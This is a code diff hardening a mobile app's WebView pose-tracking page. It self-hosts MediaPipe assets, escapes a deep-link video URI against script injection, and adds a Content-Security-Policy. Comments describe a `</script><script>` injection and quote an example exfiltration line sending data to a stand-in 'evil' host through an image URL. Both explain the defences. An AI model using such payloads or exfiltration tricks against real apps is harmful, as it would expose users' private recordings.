@@ -116,7 +116,57 @@ export const SCAN_SAMPLES = 150;
  */
 export const MIN_CLIP_SECONDS = 3;
 
-const MEDIAPIPE_BASE = "https://cdn.jsdelivr.net/npm/@mediapipe/pose@0.5.1675469404";
+/**
+ * Where the pose runtime is fetched from: our own API server.
+ *
+ * ── Why not the CDN it used to come from ────────────────────────────────────
+ * This was `https://cdn.jsdelivr.net/npm/@mediapipe/pose@…`. jsDelivr is a free
+ * public CDN with no data processing agreement and no Standard Contractual
+ * Clauses, and it received every EU/UK athlete's IP address on every pose
+ * session — a transfer to a third country with no contractual basis, which the
+ * privacy policy then had to disclose as exactly that. The API server now
+ * vendors and serves the same pinned bytes (see its
+ * `scripts/fetch-mediapipe.mjs`, which verifies a SHA-384 for every file before
+ * writing it), so the request goes to a processor already named in that
+ * document.
+ *
+ * The version here must stay in step with `VERSION` in that script. The app asks
+ * our server for these names by hand, so a bump on one side alone is a 404 at
+ * the exact moment a user tries to film.
+ */
+const MEDIAPIPE_VERSION = "0.5.1675469404";
+
+const MEDIAPIPE_BASE = `${resolveApiOrigin()}/assets/mediapipe`;
+
+/**
+ * The API origin, without the `/api` prefix the JSON client appends.
+ *
+ * Deliberately duplicated rather than imported from `lib/api.ts`: that module
+ * pulls in the auth token store and the whole request layer, and this file is
+ * imported by the WebView document builder, which needs nothing else from it.
+ */
+/**
+ * The `connect-src` allowlist: ourselves, plus the API we fetch the runtime from.
+ *
+ * `'self'` on a `file://` document is the local directory, which is what the
+ * staged clip is loaded from. `blob:` and `data:` are the shapes MediaPipe uses
+ * internally for its own worker and asset plumbing; refusing them would break
+ * the runtime rather than protect anything, since neither can name a remote host.
+ *
+ * The API origin is interpolated, so a deployment pointed at a different server
+ * gets a policy naming that server — a hard-coded origin here would silently
+ * become a policy that blocks the app's own assets the day the URL changes.
+ */
+function cspOrigin(): string {
+  return `'self' blob: data: ${resolveApiOrigin()}`;
+}
+
+function resolveApiOrigin(): string {
+  const configured = process.env.EXPO_PUBLIC_API_URL?.trim().replace(/\/+$/, "");
+  if (configured) return configured;
+  // Matches `resolveApiUrl`'s development fallback in lib/api.ts.
+  return "http://localhost:3000";
+}
 
 /**
  * Subresource Integrity hash for `pose.js`, pinned to the exact version above.
@@ -136,13 +186,56 @@ const MEDIAPIPE_BASE = "https://cdn.jsdelivr.net/npm/@mediapipe/pose@0.5.1675469
  *   curl -s https://cdn.jsdelivr.net/npm/@mediapipe/pose@<version>/pose.js \
  *     | openssl dgst -sha384 -binary | openssl base64 -A
  *
- * KNOWN GAP: the WASM/model assets `pose.js` pulls at runtime via `locateFile`
- * are not SRI-covered (they are fetched by the wasm loader, not <script> tags).
- * The complete fix is to bundle all MediaPipe assets in the app and load them
- * from the local file system, which also lets both screens drop
- * `allowUniversalAccessFromFileURLs`. Tracked in docs/TODO-PRODUCTION.md.
+ * The WASM and model assets `pose.js` pulls at runtime via `locateFile` are not
+ * SRI-covered — they are fetched by the wasm loader, not by `<script>` tags, so
+ * there is no attribute to put a hash on. That used to mean 47 kB of the 22 MB
+ * was integrity-checked and the rest, including the WebAssembly binary that
+ * actually runs and the model it runs against, was taken from a CDN on trust.
+ *
+ * They are now vendored by the API server, which verifies a SHA-384 for every
+ * one of the nine files before writing it and refuses the build on a mismatch —
+ * so the integrity check moved from the device to the build, and covers all of
+ * it rather than the entry script alone. This SRI stays as the second check on
+ * the one file that can carry one.
+ *
+ * REMAINING GAP: both screens still grant `allowUniversalAccessFromFileURLs`,
+ * because a `file://` document fetching from `https://` is cross-origin however
+ * trustworthy the origin. Closing that means bundling all 22 MB into the app
+ * itself; the size and the device-verification it needs made it a separate
+ * decision. What made that flag dangerous — an unescaped, unvalidated video URI
+ * reaching this document from a deep link — is fixed independently, in
+ * `jsonForScript` below and `isLocalAppFile` in videoStore.ts.
  */
 const MEDIAPIPE_POSE_SRI = "sha384-qcJQ+n/ZcF15Xu2EoRupB4Av+GEAGeW0Td1mp2A90u0NdNLzLYQVMUq1Ax1YAHqk";
+
+/**
+ * Serialize a value for interpolation into an inline `<script>` block.
+ *
+ * `JSON.stringify` escapes for the *JavaScript string* grammar. It does not
+ * escape for the *HTML* grammar wrapped around it, and the HTML parser finds
+ * `</script` before the JavaScript parser sees anything at all. So a value
+ * containing `</script><script>…` closes our block and opens the attacker's,
+ * and `JSON.stringify` faithfully reproduces it.
+ *
+ * That mattered here because the video URI reaching `buildPoseHtml` arrives
+ * from a route param, `/analysis/measure?uri=…`, which is reachable from a deep
+ * link — so the value is not ours. And the document it lands in is loaded with
+ * `allowFileAccessFromFileURLs` and `allowUniversalAccessFromFileURLs`, which
+ * means script running there can read the user's recorded clips off the
+ * filesystem and POST them anywhere.
+ *
+ * Escaping `<` to `\u003c` is equivalent inside a JavaScript string literal and
+ * cannot form a tag. `&` and line separators go too, for the same class of
+ * reason.
+ */
+function jsonForScript(value: unknown): string {
+  return JSON.stringify(value ?? null)
+    .replace(/</g, "\\u003c")
+    .replace(/>/g, "\\u003e")
+    .replace(/&/g, "\\u0026")
+    .replace(/\u2028/g, "\\u2028")
+    .replace(/\u2029/g, "\\u2029");
+}
 
 export function buildPoseHtml(options: {
   videoUri?: string;
@@ -165,6 +258,32 @@ export function buildPoseHtml(options: {
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+<!--
+  Content Security Policy — the exfiltration half of the file:// privilege.
+
+  This document runs with \`allowFileAccessFromFileURLs\` and
+  \`allowUniversalAccessFromFileURLs\`, which it needs because it fetches the pose
+  runtime over https from a file:// origin. The danger those flags create is not
+  that script here can *read* local files — it is that it can read them and then
+  send them somewhere. \`connect-src\` is what closes the second half: fetch, XHR,
+  WebSocket and sendBeacon can only reach our own API, so there is nowhere for a
+  stolen clip to go. \`img-src\` closes the oldest workaround for exactly that
+  (\`new Image().src = "https://evil/?" + data\`), and \`form-action\` the other one.
+
+  ── What is deliberately NOT restricted ──────────────────────────────────────
+  There is no \`default-src\` and no \`script-src\` here, and that is a choice, not
+  an omission. Restricting those correctly around a WebAssembly module that
+  compiles a 6 MB binary and spawns its own workers is exactly the kind of change
+  that looks right, ships, and then fails on one iOS version — and pose tracking
+  is the product. Without \`default-src\`, an unlisted directive is simply
+  unrestricted, so what is written below is the whole of what is enforced, and
+  none of it touches how the runtime loads.
+
+  The directives that would matter most against *injected script running here*
+  are the ones listed. The directives that would stop it running at all are the
+  ones that need a device to verify.
+-->
+<meta http-equiv="Content-Security-Policy" content="connect-src ${cspOrigin()}; img-src 'self' data: blob:; media-src 'self' blob: data: file:; form-action 'none'; base-uri 'none'; frame-ancestors 'none'">
 <style>
 *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
 html,body{width:100%;height:100%;overflow:hidden;background:#101312;font-family:-apple-system,sans-serif;color:#EDECE7}
@@ -275,7 +394,15 @@ ${
 <div id="loading">
   <div class="spin"></div>
   <p class="load-text">${isScan ? "Measuring your movement…" : "Loading pose model…"}</p>
-  <p class="load-sub" id="loadSub">First run downloads ~6&nbsp;MB.<br>Later runs load from cache.</p>
+  <!-- The figure was "~6 MB" and had been wrong since this build pinned
+       modelComplexity: 1. The "full" landmark model alone is 6.4 MB, and a cold
+       run also fetches both wasm variants (the SIMD one and the non-SIMD
+       fallback, because pose.js requests both and lets the browser choose),
+       their glue, the packed detector assets and the graph — 21 MB in total,
+       byte-counted against the pinned version. Understating a download by 3.5x
+       to someone on cellular is the kind of small dishonesty that costs trust
+       for nothing. -->
+  <p class="load-sub" id="loadSub">First run downloads about 21&nbsp;MB.<br>Later runs load from cache.</p>
 </div>
 
 <script src="${MEDIAPIPE_BASE}/pose.js" crossorigin="anonymous"
@@ -284,15 +411,15 @@ ${
 <script>
 (function(){
   "use strict";
-  var VIDEO_URI = ${videoUri ? JSON.stringify(videoUri) : "null"};
+  var VIDEO_URI = ${jsonForScript(videoUri)};
   var IS_SCAN = ${isScan ? "true" : "false"};
   var SCAN_SAMPLES = ${SCAN_SAMPLES};
   // Sport-specific classification bands (see constants/riskProfiles.ts).
   // Serialized into the document so the WebView classifies frames against
   // exactly the profile this build selected — and reports it back as
   // provenance alongside the counts it produced.
-  var ZONES = ${JSON.stringify(profile.zones)};
-  var RISK_PROFILE = ${JSON.stringify({ id: profile.id, version: RISK_PROFILE_VERSION, zones: profile.zones })};
+  var ZONES = ${jsonForScript(profile.zones)};
+  var RISK_PROFILE = ${jsonForScript({ id: profile.id, version: RISK_PROFILE_VERSION, zones: profile.zones })};
 
   function post(msg){
     try { window.ReactNativeWebView.postMessage(JSON.stringify(msg)); } catch(e){}
